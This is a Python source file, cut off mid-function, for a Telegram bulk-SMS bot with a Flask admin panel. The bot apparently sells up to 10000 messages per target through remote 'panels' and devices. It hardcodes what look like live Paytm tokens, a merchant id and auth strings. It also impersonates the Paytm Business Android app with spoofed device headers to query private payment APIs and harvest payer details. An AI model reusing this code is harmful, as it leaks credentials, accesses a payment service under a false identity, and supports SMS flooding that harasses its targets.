#!/usr/bin/env python3

"""

Khaat Bot - Telegram SMS Bot + Web Admin Dashboard

Merged from bot.py + xcaliber_web.py

"""



import os
import sys
import json
import time
import gzip
import asyncio
import logging
import threading

import asyncpg

import aiohttp

import httpx

import redis.asyncio as aioredis

from datetime import datetime, timedelta

from urllib.parse import urlparse, parse_qs

from concurrent.futures import ThreadPoolExecutor, as_completed

from telegram import (

    Update,

    InlineKeyboardButton,

    InlineKeyboardMarkup,

    BotCommand,

)

from telegram.ext import (

    Application,

    CommandHandler,

    CallbackQueryHandler,

    MessageHandler,

    ContextTypes,

    filters,

)



# ─── CONFIG  ──────────────────────────────────────────────────────────────

BOT_TOKEN = os.getenv("BOT_TOKEN", "")

if not BOT_TOKEN:

    raise RuntimeError("BOT_TOKEN env var is required")

BASE_URL = os.getenv("BASE_URL", "https://texther.site.je")

SMS_COST = float(os.getenv("SMS_COST", "0.05"))

WEB_URL = os.getenv("WEB_URL", "http://13.207.147.149:5000")

ADMIN_IDS = []  # populated from settings table

PAYMENT_WEBHOOK_SECRET = os.getenv("PAYMENT_WEBHOOK_SECRET", "")



PG_CONFIG = {

    "host": os.getenv("PG_HOST", "localhost"),

    "port": int(os.getenv("PG_PORT", 5432)),

    "database": os.getenv("PG_DB", "aat"),

    "user": os.getenv("PG_USER", "postgres"),

    "password": os.getenv("PG_PASS", ""),

}

if not PG_CONFIG["password"]:

    raise RuntimeError("PG_PASS env var is required")



REDIS_URL = os.getenv("REDIS_URL", f"redis://{os.getenv('REDIS_HOST', 'localhost')}:{os.getenv('REDIS_PORT', '6379')}/0")

async def cache_get(key: str):
    if redis_client:
        try:
            return await redis_client.get(key)
        except Exception:
            pass
    return None

async def cache_setex(key: str, ttl: int, val: str):
    if redis_client:
        try:
            await redis_client.setex(key, ttl, val)
        except Exception:
            pass

async def cache_delete(key: str):
    if redis_client:
        try:
            await redis_client.delete(key)
        except Exception:
            pass






COUNT_OPTS = [

    [

        InlineKeyboardButton("1", callback_data="c_1"),

        InlineKeyboardButton("5", callback_data="c_5"),

        InlineKeyboardButton("10", callback_data="c_10"),

    ],

    [

        InlineKeyboardButton("25", callback_data="c_25"),

        InlineKeyboardButton("50", callback_data="c_50"),

        InlineKeyboardButton("100", callback_data="c_100"),

    ],

    [

        InlineKeyboardButton("200", callback_data="c_200"),

        InlineKeyboardButton("500", callback_data="c_500"),

        InlineKeyboardButton("1000", callback_data="c_1000"),

    ],

    [

        InlineKeyboardButton("5000", callback_data="c_5000"),

        InlineKeyboardButton("10000", callback_data="c_10000"),

    ],

]



MAIN_MENU = None  # built lazily after settings load





def get_main_menu():
    global MAIN_MENU
    channel_url = settings_cache.get("channel_url", "")
    rows = [
        [InlineKeyboardButton("⚡ Send SMS", callback_data="sms_start")],
        [InlineKeyboardButton("📥 Received SMS", callback_data="user_received_sms"), InlineKeyboardButton("💳 My Wallet", callback_data="balance")],
        [InlineKeyboardButton("💰 Topup", callback_data="topup"), InlineKeyboardButton("🎁 Refer & Earn", callback_data="referral")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("🧾 Txn History", callback_data="txn_history")],
        [InlineKeyboardButton("🔍 Verify UTR", callback_data="vutr")],
    ]
    if channel_url:
        rows.append([InlineKeyboardButton("📢 Join Channel", url=channel_url)])
    return rows



BACK_BTN = [[InlineKeyboardButton("◀ Back", callback_data="back")]]



import uuid

import hashlib

import secrets

import threading

import urllib.request

import urllib.error

from functools import wraps

from contextlib import contextmanager

from markupsafe import escape



import psycopg2

import psycopg2.extras

import redis

from concurrent.futures import ThreadPoolExecutor, as_completed

from flask import (

    Flask, render_template_string, request, redirect, url_for,

    session, flash, jsonify, abort, g

)



REDIS_HOST = os.getenv("REDIS_HOST", "localhost")

REDIS_PORT = int(os.getenv("REDIS_PORT", 6379))



# ─── LOGGING  ─────────────────────────────────────────────────────────────

logging.basicConfig(

    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",

    level=logging.INFO,

)

log = logging.getLogger("khaat-bot")



# ─── GLOBALS  ─────────────────────────────────────────────────────────────

states: dict = {}

pool: asyncpg.Pool = None

redis_client: aioredis.Redis = None

panel_manager = None

bot_application = None

settings_cache: dict = {}



# ═══════════════════════════════════════════════════════════════════════════

# WEB GLOBALS (Flask)

# ═══════════════════════════════════════════════════════════════════════════



app = Flask(__name__)

_flask_secret = os.getenv("FLASK_SECRET", "")

if not _flask_secret:

    _secret_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".flask_secret")

    if os.path.exists(_secret_file):

        with open(_secret_file) as _f:

            _flask_secret = _f.read().strip()

    if not _flask_secret:

        _flask_secret = secrets.token_hex(32)

        with open(_secret_file, "w") as _f:

            _f.write(_flask_secret)

        log.warning("Generated persistent FLASK_SECRET at %s", _secret_file)

app.secret_key = _flask_secret

app.permanent_session_lifetime = timedelta(hours=12)





# ─── CSRF Protection  ─────────────────────────────────────────────────────



def generate_csrf_token():

    if "_csrf_token" not in session:

        session["_csrf_token"] = secrets.token_hex(32)

    return session["_csrf_token"]



app.jinja_env.globals["csrf_token"] = generate_csrf_token



# ─── Login Rate Limiting  ─────────────────────────────────────────────────

_login_attempts: dict = {}

LOGIN_MAX_ATTEMPTS = 5

LOGIN_LOCKOUT_SECONDS = 300





def _is_login_locked(ip):

    attempts, first_at = _login_attempts.get(ip, (0, 0))

    if attempts >= LOGIN_MAX_ATTEMPTS:

        elapsed = time.time() - first_at

        if elapsed < LOGIN_LOCKOUT_SECONDS:

            return True, int(LOGIN_LOCKOUT_SECONDS - elapsed)

        _login_attempts.pop(ip, None)

    return False, 0





def _record_login_attempt(ip):

    attempts, first_at = _login_attempts.get(ip, (0, 0))

    if attempts == 0 or (time.time() - first_at) > LOGIN_LOCKOUT_SECONDS:

        _login_attempts[ip] = (1, time.time())

    else:

        _login_attempts[ip] = (attempts + 1, first_at)





@app.before_request

def csrf_protect():

    if request.method != "POST":

        return

    if request.endpoint in ("login",):

        return

    if session.get("admin_logged"):

        return

    token = session.get("_csrf_token", None)

    form_token = request.form.get("_csrf_token", "")

    json_token = ""

    if request.is_json:

        json_token = (request.get_json(silent=True) or {}).get("_csrf_token", "")

    if not token or (token != form_token and token != json_token):

        if request.path.startswith("/api/"):

            return jsonify({"error": "CSRF token invalid"}), 403

        return "CSRF token missing or invalid", 403



PROBE_CACHE = {

    "last_run": None,

    "results": {

        "panels": {"total": 0, "active": 0, "working": 0},

        "devices": {"total": 0, "online": 0},

        "numbers": {"total": 0, "online": 0},

    },

}



LIVE_CACHE = {

    "online_devices": [],

    "total_panels": 0,

    "working_panels": 0,

    "total_devices": 0,

    "total_online": 0,

    "total_numbers": 0,

    "total_online_numbers": 0,

    "last_update": None,

    "probe_running": False,

    "sms_logs": [],

    "received_sms": [],

    "payments": [],

}



# ═══════════════════════════════════════════════════════════════════════════

# SYNC POSTGRES (Flask web)

# ═══════════════════════════════════════════════════════════════════════════





class PgConn:

    def __init__(self):

        self.config = PG_CONFIG



    def get_conn(self):

        return psycopg2.connect(**self.config)



    @contextmanager

    def cursor(self, commit=False, dict_cursor=False):

        conn = self.get_conn()

        try:

            cur_factory = psycopg2.extras.RealDictCursor if dict_cursor else None

            cur = conn.cursor(cursor_factory=cur_factory)

            yield cur

            if commit:

                conn.commit()

        finally:

            cur.close()

            conn.close()



    def execute(self, query, params=None, commit=False, dict_cursor=False):

        with self.cursor(commit=commit, dict_cursor=dict_cursor) as cur:

            cur.execute(query, params)

            return cur.fetchall()



    def execute_one(self, query, params=None, dict_cursor=False):

        with self.cursor(commit=False, dict_cursor=dict_cursor) as cur:

            cur.execute(query, params)

            return cur.fetchone()



    def execute_write(self, query, params=None):

        with self.cursor(commit=True) as cur:

            cur.execute(query, params)





pg = PgConn()



try:

    rds = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, decode_responses=True)

    rds.ping()

except Exception:

    rds = None





# ─── Web Database Init  ───────────────────────────────────────────────────



def init_web_db():

    tables = [

        """CREATE TABLE IF NOT EXISTS admin (

            id SERIAL PRIMARY KEY,

            username TEXT UNIQUE NOT NULL,

            password TEXT NOT NULL,

            token TEXT

        )""",

        """CREATE TABLE IF NOT EXISTS users (

            user_id TEXT PRIMARY KEY,

            balance REAL DEFAULT 0,

            sms_sent INTEGER DEFAULT 0,

            joined TEXT,

            last_active TEXT

        )""",

        """CREATE TABLE IF NOT EXISTS databases (

            id TEXT PRIMARY KEY,

            url TEXT UNIQUE,

            name TEXT,

            added TEXT,

            status TEXT DEFAULT 'active',

            sms_sent INTEGER DEFAULT 0

        )""",

        """CREATE TABLE IF NOT EXISTS devices (

            device_id TEXT PRIMARY KEY,

            info TEXT,

            online INTEGER DEFAULT 0,

            last_seen TEXT

        )""",

        """CREATE TABLE IF NOT EXISTS numbers (

            number TEXT PRIMARY KEY,

            info TEXT,

            online INTEGER DEFAULT 0,

            last_seen TEXT

        )""",

        """CREATE TABLE IF NOT EXISTS payments (

            biz_order_id TEXT PRIMARY KEY,

            merchant_trans_id TEXT,

            amount REAL,

            currency TEXT,

            pay_time TEXT,

            payer_name TEXT,

            payer_vpa TEXT,

            payer_psp TEXT,

            created_at TEXT,

            claimed_by TEXT,

            claimed_at TEXT

        )""",

        """CREATE TABLE IF NOT EXISTS settings (

            key TEXT PRIMARY KEY,

            value TEXT

        )""",

        """CREATE TABLE IF NOT EXISTS sms_logs (

            id SERIAL PRIMARY KEY,

            user_id TEXT,

            target TEXT,

            panel TEXT,

            status TEXT,

            message TEXT,

            created_at TEXT

        )""",

        """CREATE TABLE IF NOT EXISTS api_keys (

            key TEXT PRIMARY KEY,

            user_id TEXT,

            name TEXT,

            active INTEGER DEFAULT 1,

            created_at TEXT

        )""",

    ]

    for t in tables:

        pg.execute_write(t)



    pg.execute_write("ALTER TABLE payments ADD COLUMN IF NOT EXISTS claimed_by TEXT")

    pg.execute_write("ALTER TABLE payments ADD COLUMN IF NOT EXISTS claimed_at TEXT")



    pg.execute_write("ALTER TABLE users ADD COLUMN IF NOT EXISTS name TEXT DEFAULT ''")

    pg.execute_write("ALTER TABLE users ADD COLUMN IF NOT EXISTS username TEXT DEFAULT ''")

    pg.execute_write("ALTER TABLE users ADD COLUMN IF NOT EXISTS banned INTEGER DEFAULT 0")

    pg.execute_write("ALTER TABLE users ADD COLUMN IF NOT EXISTS ban_reason TEXT DEFAULT ''")



    pg.execute_write("""CREATE TABLE IF NOT EXISTS sms_received (

        id SERIAL PRIMARY KEY,

        number TEXT,

        message TEXT,

        panel TEXT,

        received_at TEXT

    )""")



    existing = pg.execute_one("SELECT id FROM admin WHERE username = %s", ("admin",))

    if not existing:

        import secrets

        temp_pass = secrets.token_urlsafe(8)

        h = hashlib.sha256(temp_pass.encode()).hexdigest()

        pg.execute_write("INSERT INTO admin (username, password) VALUES (%s, %s)", ("admin", h))

        logging.warning("Default admin created - change password immediately! Username: admin Temp password: %s", temp_pass)



    defaults = {

        "sms_cost": "0.05",

        "bot_token": "",

        "paytm_mid": "",

        "paytm_key": "",

        "paytm_merchant_id": "",

        "telegram_chat_id": "",

        "welcome_message": "Welcome to Xcaliber SMS Service",

        "min_deposit": "50",

        "signup_bonus": "0",

        "referral_bonus": "5",

    }

    for k, v in defaults.items():

        existing = pg.execute_one("SELECT key FROM settings WHERE key = %s", (k,))

        if not existing:

            pg.execute_write("INSERT INTO settings (key, value) VALUES (%s, %s)", (k, v))



# ─── DATABASE HELPERS  ────────────────────────────────────────────────────





async def init_db():

    global pool, redis_client

    pool = await asyncpg.create_pool(**PG_CONFIG, min_size=2, max_size=10)

    redis_client = aioredis.from_url(REDIS_URL, decode_responses=True)

    await create_tables()





async def create_tables():
    async with pool.acquire() as conn:
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id TEXT PRIMARY KEY,
                balance REAL DEFAULT 0,
                sms_sent INTEGER DEFAULT 0,
                joined TEXT,
                last_active TEXT,
                name TEXT DEFAULT '',
                username TEXT DEFAULT '',
                banned INTEGER DEFAULT 0,
                ban_reason TEXT DEFAULT '',
                referred_by TEXT DEFAULT ''
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS databases (
                id TEXT PRIMARY KEY,
                url TEXT UNIQUE,
                name TEXT,
                added TEXT,
                status TEXT DEFAULT 'active',
                sms_sent INTEGER DEFAULT 0,
                devices_online INTEGER DEFAULT 0
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS payments (
                biz_order_id TEXT PRIMARY KEY,
                merchant_trans_id TEXT,
                amount REAL,
                currency TEXT DEFAULT 'INR',
                pay_time TEXT,
                payer_name TEXT,
                payer_vpa TEXT,
                payer_psp TEXT,
                created_at TEXT,
                claimed_by TEXT,
                claimed_at TEXT
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS sms_logs (
                id SERIAL PRIMARY KEY,
                user_id TEXT,
                target TEXT,
                panel TEXT,
                status TEXT,
                message TEXT,
                created_at TEXT
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS sms_received (
                id SERIAL PRIMARY KEY,
                number TEXT,
                from_number TEXT,
                to_number TEXT,
                message TEXT,
                panel TEXT,
                received_at TEXT
            )
        """)
        await conn.execute("ALTER TABLE payments ADD COLUMN IF NOT EXISTS claimed_by TEXT")
        await conn.execute("ALTER TABLE payments ADD COLUMN IF NOT EXISTS claimed_at TEXT")
        await conn.execute("ALTER TABLE databases ADD COLUMN IF NOT EXISTS devices_online INTEGER DEFAULT 0")
        await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS name TEXT DEFAULT ''")
        await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS username TEXT DEFAULT ''")
        await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS banned INTEGER DEFAULT 0")
        await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS ban_reason TEXT DEFAULT ''")
        await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS referred_by TEXT DEFAULT ''")
        await conn.execute("ALTER TABLE sms_received ADD COLUMN IF NOT EXISTS from_number TEXT")
        await conn.execute("ALTER TABLE sms_received ADD COLUMN IF NOT EXISTS to_number TEXT")
async def load_settings():

    global settings_cache, ADMIN_IDS, BOT_TOKEN, SMS_COST

    async with pool.acquire() as conn:

        rows = await conn.fetch("SELECT key, value FROM settings")

    for row in rows:

        settings_cache[row["key"]] = row["value"]



    token_val = settings_cache.get("bot_token", "").strip()

    if token_val:

        BOT_TOKEN = token_val

    if "sms_cost" in settings_cache and settings_cache["sms_cost"]:

        SMS_COST = float(settings_cache["sms_cost"])

    if "admin_ids" in settings_cache and settings_cache["admin_ids"]:

        ADMIN_IDS = [int(x.strip()) for x in settings_cache["admin_ids"].split(",") if x.strip().isdigit()]

    log.info("Settings loaded: %s", settings_cache)





def load_settings_sync():

    """Synchronous settings loader for Flask routes."""

    global settings_cache, ADMIN_IDS, BOT_TOKEN, SMS_COST

    try:

        rows = pg.execute("SELECT key, value FROM settings", dict_cursor=True)

        for row in rows:

            settings_cache[row["key"]] = row["value"]

        token_val = settings_cache.get("bot_token", "").strip()

        if token_val:

            BOT_TOKEN = token_val

        if "sms_cost" in settings_cache and settings_cache["sms_cost"]:

            SMS_COST = float(settings_cache["sms_cost"])

        if "admin_ids" in settings_cache and settings_cache["admin_ids"]:
            ADMIN_IDS = [int(x.strip()) for x in settings_cache["admin_ids"].split(",") if x.strip().isdigit()]
        elif os.getenv("ADMIN_IDS"):
            ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS").split(",") if x.strip().isdigit()]

    except Exception as e:

        log.warning("Sync settings load failed: %s", e)





# ─── USER CRUD  ───────────────────────────────────────────────────────────





async def get_user(uid: int, name: str = "", username: str = "") -> dict:
    uid_str = str(uid)
    cached = await cache_get(f"user:{uid_str}")
    if cached:
        try:
            user = json.loads(cached)
            if name or username:
                async with pool.acquire() as conn:
                    await conn.execute("UPDATE users SET name = COALESCE(NULLIF($1,''), name), username = COALESCE(NULLIF($2,''), username) WHERE user_id = $3", name, username, uid_str)
                if name:
                    user["name"] = name
                if username:
                    user["username"] = username
                await cache_setex(f"user:{uid_str}", 300, json.dumps(user))
            return user
        except Exception:
            pass

    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT * FROM users WHERE user_id = $1", uid_str)
        now = datetime.utcnow().isoformat()
        if not row:
            display_name = name or ""
            uname = username or ""
            await conn.execute(
                "INSERT INTO users (user_id, balance, sms_sent, joined, last_active, name, username) VALUES ($1, 0, 0, $2, $2, $3, $4)",
                uid_str, now, display_name, uname,
            )
            row = await conn.fetchrow("SELECT * FROM users WHERE user_id = $1", uid_str)
        else:
            await conn.execute(
                "UPDATE users SET last_active = $1, name = COALESCE(NULLIF($3,''), name), username = COALESCE(NULLIF($4,''), username) WHERE user_id = $2",
                now, uid_str, name, username,
            )
            row = await conn.fetchrow("SELECT * FROM users WHERE user_id = $1", uid_str)

    user = dict(row)
    await cache_setex(f"user:{uid_str}", 300, json.dumps(user))
    return user


async def add_balance(uid: int, amount: float):
    uid_str = str(uid)
    async with pool.acquire() as conn:
        await conn.execute(
            "UPDATE users SET balance = balance + $1 WHERE user_id = $2",
            float(amount),
            uid_str,
        )
    await cache_delete(f"user:{uid_str}")





async def deduct_balance(uid: int, amount: float) -> bool:
    uid_str = str(uid).strip()
    amt = round(float(amount), 4)
    if amt <= 0:
        return True
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "UPDATE users SET balance = balance - $1 WHERE user_id = $2 AND balance >= $1 RETURNING balance",
            amt, uid_str
        )
        if not row:
            return False
    await cache_delete(f"user:{uid_str}")
    return True





async def get_balance(uid: int) -> float:

    user = await get_user(uid)

    return user.get("balance", 0.0)





_ALLOWED_USER_COLS = frozenset({

    "name", "username", "balance", "sms_sent", "status", "premium",

    "referred_by", "last_active", "joined", "phone", "referral_code",

    "total_deposit", "ref_earnings", "pending_withdrawal",

})



async def update_user(uid: int, **kwargs):

    uid_str = str(uid)

    if not kwargs:

        return

    set_parts = []

    values = []

    idx = 1

    for k, v in kwargs.items():

        if k not in _ALLOWED_USER_COLS:

            continue

        set_parts.append(f"{k} = ${idx}")

        values.append(v)

        idx += 1

    if not set_parts:

        return

    values.append(uid_str)

    sql = f"UPDATE users SET {', '.join(set_parts)} WHERE user_id = ${idx}"

    async with pool.acquire() as conn:

        await conn.execute(sql, *values)

    await redis_client.delete(f"user:{uid_str}")





async def increment_sms(uid: int):

    uid_str = str(uid)

    async with pool.acquire() as conn:

        await conn.execute("UPDATE users SET sms_sent = sms_sent + 1 WHERE user_id = $1", uid_str)

    await redis_client.delete(f"user:{uid_str}")







# ─── PAYTM SESSION & LIVE PAYMENT VERIFICATION ──────────────────────────────

PAYTM_SESSION_FILE = "paytm_session.json"

DEFAULT_PAYTM_SESSION = {
    "merchant_id": "uSherH20708687937743",
    "refresh_token": "0e8upwnmg85x75x9ilrt895drptlg8za0121",
    "access_token": "07ayitq7cpzt0tnm0x2i2ks2grtlhu3w0121",
    "device_id": "OnePlus-GM1901-d7ab42578ca00369",
    "expires_in": "1821159212000"
}

PAYTM_CONFIG = {
    "auth_ump": "umpapp-3754-36d-aqr-cn7",
    "app_version": "9.44.2"
}

def load_paytm_session() -> dict:
    try:
        if os.path.exists(PAYTM_SESSION_FILE):
            with open(PAYTM_SESSION_FILE, "r") as f:
                data = json.load(f)
                if data.get("access_token") and data.get("refresh_token"):
                    return data
    except Exception as e:
        log.warning("load_paytm_session file error: %s", e)
    
    mid = settings_cache.get("paytm_mid") or settings_cache.get("paytm_merchant_id") or DEFAULT_PAYTM_SESSION["merchant_id"]
    sess = DEFAULT_PAYTM_SESSION.copy()
    sess["merchant_id"] = mid
    return sess

def save_paytm_session(session_data: dict):
    try:
        with open(PAYTM_SESSION_FILE, "w") as f:
            json.dump(session_data, f, indent=2)
    except Exception as e:
        log.warning("save_paytm_session error: %s", e)

def refresh_paytm_token() -> dict:
    session = load_paytm_session()
    url = "https://accounts.paytm.com/oauth2/v3/token/sv1?client=androidapp"
    ver = PAYTM_CONFIG.get("app_version", "9.44.2")
    headers = {
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Accept-Encoding": "gzip",
        "User-Agent": f"Paytm Release/{ver}/904402 (com.paytm.business; Android/12 OnePlus/GM1901)",
        "Authorization": "Basic UGF5dG0tU2VjdXJlLUJ1c2luZXNzLWFwcDo4Yjg1ZDJmMS1lZDk1LTRlNTAtOWJlNy02YTdhNDlhOGM5ZGY=",
        "x-device-identifier": session.get("device_id", DEFAULT_PAYTM_SESSION["device_id"]),
        "x-device-name": "GM1901",
        "x-mfg": "OnePlus",
        "x-model": "GM1901",
        "x-id": "d7ab42578ca00369",
        "x-app-version": ver
    }
    payload = {
        "grantType": "refresh_token",
        "deviceId": session.get("device_id", DEFAULT_PAYTM_SESSION["device_id"]),
        "refreshToken": session.get("refresh_token", DEFAULT_PAYTM_SESSION["refresh_token"])
    }
    data_bytes = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=data_bytes, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=15) as res:
            raw = res.read()
            if res.info().get("Content-Encoding") == "gzip":
                raw = gzip.decompress(raw)
            data = json.loads(raw.decode("utf-8"))
            tokens = data.get("tokens", [])
            for t in tokens:
                if t.get("scope") == "paytm" or t.get("tokenType") == "BEARER":
                    session["access_token"] = t.get("accessToken")
                    session["expires_in"] = t.get("expiresIn")
                    save_paytm_session(session)
                    log.info("Paytm session token refreshed successfully")
                    return {"success": True, "access_token": session["access_token"], "expires_in": session["expires_in"]}
            return {"success": False, "error": "No token in response", "raw": data}
    except urllib.error.HTTPError as e:
        raw = e.read()
        if e.info().get("Content-Encoding") == "gzip":
            raw = gzip.decompress(raw)
        err = raw.decode("utf-8", errors="ignore")
        log.error("Paytm token refresh HTTP error %d: %s", e.code, err)
        return {"success": False, "error_code": e.code, "message": err}
    except Exception as ex:
        log.error("Paytm token refresh exception: %s", ex)
        return {"success": False, "error": str(ex)}

def _paytm_api_call(url: str, payload: dict, retry: bool = True) -> dict:
    session = load_paytm_session()
    ver = PAYTM_CONFIG["app_version"]
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json",
        "User-Agent": f"Paytm Release/{ver}/904402 (com.paytm.business; Android/12 OnePlus/GM1901)",
        "appversion": ver,
        "app-channel": "p4b",
        "client": "androidapp",
        "deviceidentifier": session.get("device_id", DEFAULT_PAYTM_SESSION["device_id"]),
        "osversion": "12",
        "x-id": "d7ab42578ca00369",
        "x-mfg": "OnePlus",
        "x-model": "GM1901",
        "x-auth-ump": PAYTM_CONFIG["auth_ump"],
        "x-user-token": session.get("access_token", DEFAULT_PAYTM_SESSION["access_token"]),
        "x-user-mid": session.get("merchant_id", DEFAULT_PAYTM_SESSION["merchant_id"])
    }
    data_bytes = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=data_bytes, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=15) as res:
            raw = res.read()
            if res.info().get("Content-Encoding") == "gzip":
                raw = gzip.decompress(raw)
            return json.loads(raw.decode("utf-8"))
    except urllib.error.HTTPError as e:
        raw = e.read()
        if e.info().get("Content-Encoding") == "gzip":
            raw = gzip.decompress(raw)
        err_msg = raw.decode("utf-8", errors="ignore")
        if retry and (e.code in (401, 403, 410) or "token" in err_msg.lower() or "unauthorized" in err_msg.lower()):
            log.info("Paytm API token expired/invalid. Refreshing session token...")
            ref = refresh_paytm_token()
            if ref.get("success"):
                return _paytm_api_call(url, payload, retry=False)
        raise RuntimeError(f"Paytm API error {e.code}: {err_msg}")

def verify_paytm_payment_live(utr: str, days: int = 5) -> dict:
    utr_clean = str(utr).strip()
    now = datetime.now()
    start = (now - timedelta(days=days)).strftime("%Y-%m-%dT00:00:00+05:30")
    end = now.strftime("%Y-%m-%dT23:59:59+05:30")
    list_url = "https://dashboard.paytm.com/api/v2/order/summary/list"
    payload = {
        "payMethod": "UPI",
        "startDate": start,
        "endDate": end,
        "pageEntryNumber": 1,
        "isDealMid": False,
        "isStoreCashMid": False,
        "bizTypeList": ["ACQUIRING"],
        "orderStatusList": ["SUCCESS"]
    }
    try:
        resp = _paytm_api_call(list_url, payload)
        orders = []
        for day in resp.get("daywiseOrderList", []):
            orders.extend(day.get("orderList", []))
        
        for order in orders:
            biz_id = str(order.get("bizOrderId", "")).strip()
            amt = float(order.get("payMoneyAmount", {}).get("value", 0)) / 100.0
            dtl_url = "https://dashboard.paytm.com/api/v4/order/detail?channel=p4b"
            dtl = _paytm_api_call(dtl_url, {
                "bizOrderId": biz_id,
                "isSettlementInfo": True,
                "version": PAYTM_CONFIG["app_version"],
                "client": "android"
            })
            add_info = dtl.get("additionalInfo", {})
            rrn = str(add_info.get("rrn", "")).strip()
            status = dtl.get("orderStatus")
            
            if (rrn == utr_clean or biz_id == utr_clean) and status == "SUCCESS":
                return {
                    "verified": True,
                    "utr": rrn or utr_clean,
                    "biz_order_id": biz_id,
                    "merchant_trans_id": dtl.get("merchantTransId", ""),
                    "amount": amt,
                    "currency": "INR",
                    "payer_name": add_info.get("customerName", "Customer"),
                    "payer_vpa": add_info.get("virtualPaymentAddr", ""),
                    "payer_psp": add_info.get("payerPSP", "UPI"),
                    "pay_time": dtl.get("orderCompletedTime", datetime.now().isoformat()),
                    "status": "SUCCESS"
                }
        return {"verified": False, "message": f"No payment found for UTR {utr_clean}"}
    except Exception as e:
        log.error("verify_paytm_payment_live error for UTR %s: %s", utr_clean, e)
        return {"verified": False, "message": str(e)}

def sync_paytm_recent_orders_sync(days: int = 5) -> int:
    now = datetime.now()
    start = (now - timedelta(days=days)).strftime("%Y-%m-%dT00:00:00+05:30")
    end = now.strftime("%Y-%m-%dT23:59:59+05:30")
    list_url = "https://dashboard.paytm.com/api/v2/order/summary/list"
    payload = {
        "payMethod": "UPI",
        "startDate": start,
        "endDate": end,
        "pageEntryNumber": 1,
        "isDealMid": False,
        "isStoreCashMid": False,
        "bizTypeList": ["ACQUIRING"],
        "orderStatusList": ["SUCCESS"]
    }
    count = 0
    try:
        resp = _paytm_api_call(list_url, payload)
        orders = []
        for day in resp.get("daywiseOrderList", []):
            orders.extend(day.get("orderList", []))
        
        for order in orders:
            biz_id = str(order.get("bizOrderId", "")).strip()
            if not biz_id:
                continue
            amt = float(order.get("payMoneyAmount", {}).get("value", 0)) / 100.0
            dtl_url = "https://dashboard.paytm.com/api/v4/order/detail?channel=p4b"
            dtl = _paytm_api_call(dtl_url, {
                "bizOrderId": biz_id,
                "isSettlementInfo": True,
                "version": PAYTM_CONFIG["app_version"],
                "client": "android"
            })
            add_info = dtl.get("additionalInfo", {})
            rrn = str(add_info.get("rrn", "")).strip()
            status = dtl.get("orderStatus")
            if status == "SUCCESS":
                pay_add(
                    biz_order_id=biz_id,
                    merchant_trans_id=dtl.get("merchantTransId", ""),
                    amount=amt,
                    currency="INR",
                    pay_time=dtl.get("orderCompletedTime", datetime.now().isoformat()),
                    payer_name=add_info.get("customerName", ""),
                    payer_vpa=add_info.get("virtualPaymentAddr", ""),
                    payer_psp=add_info.get("payerPSP", ""),
                    utr=rrn or biz_id
                )
                count += 1
        return count
    except Exception as e:
        log.error("sync_paytm_recent_orders_sync error: %s", e)
        return count

async def verify_utr(utr: str) -> dict | None:
    clean = str(utr).strip()
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT * FROM payments WHERE biz_order_id = $1 OR utr = $1", clean)
    if row:
        return dict(row)
    
    # Check live Paytm API with auto session token refresh
    try:
        loop = asyncio.get_running_loop()
        live = await loop.run_in_executor(None, verify_paytm_payment_live, clean)
        if live and live.get("verified"):
            now = datetime.now().isoformat()
            async with pool.acquire() as conn:
                await conn.execute(
                    """INSERT INTO payments (biz_order_id, merchant_trans_id, amount, currency, pay_time, payer_name, payer_vpa, payer_psp, utr, status, created_at)
                    VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, 'SUCCESS', $10)
                    ON CONFLICT (biz_order_id) DO UPDATE SET utr = COALESCE(EXCLUDED.utr, payments.utr), amount = EXCLUDED.amount""",
                    live["biz_order_id"], live.get("merchant_trans_id", ""), float(live["amount"]), "INR",
                    live.get("pay_time", ""), live.get("payer_name", ""), live.get("payer_vpa", ""),
                    live.get("payer_psp", ""), live.get("utr", clean), now
                )
                inserted = await conn.fetchrow("SELECT * FROM payments WHERE biz_order_id = $1 OR utr = $1", clean)
            return dict(inserted) if inserted else live
    except Exception as e:
        log.error("verify_utr live paytm exception: %s", e)
    return None





async def get_all_users() -> list:

    async with pool.acquire() as conn:

        rows = await conn.fetch("SELECT * FROM users ORDER BY joined DESC")

    return [dict(r) for r in rows]





async def get_all_panels() -> list:

    async with pool.acquire() as conn:

        rows = await conn.fetch("SELECT * FROM databases WHERE status = 'active'")

    return [dict(r) for r in rows]





async def update_panel_sms(panel_id: str):

    async with pool.acquire() as conn:

        await conn.execute("UPDATE databases SET sms_sent = sms_sent + 1 WHERE id = $1", panel_id)





async def update_panel_devices(panel_id: str, count: int):

    async with pool.acquire() as conn:

        await conn.execute("UPDATE databases SET devices_online = $1 WHERE id = $2", count, panel_id)





async def log_sms(user_id: str, target: str, panel: str, status: str, message: str):

    async with pool.acquire() as conn:

        await conn.execute(

            "INSERT INTO sms_logs (user_id, target, panel, status, message, created_at) VALUES ($1,$2,$3,$4,$5,$6)",

            user_id,

            target,

            panel,

            status,

            message,

            datetime.utcnow().isoformat(),

        )





async def get_total_sms_sent() -> int:

    async with pool.acquire() as conn:

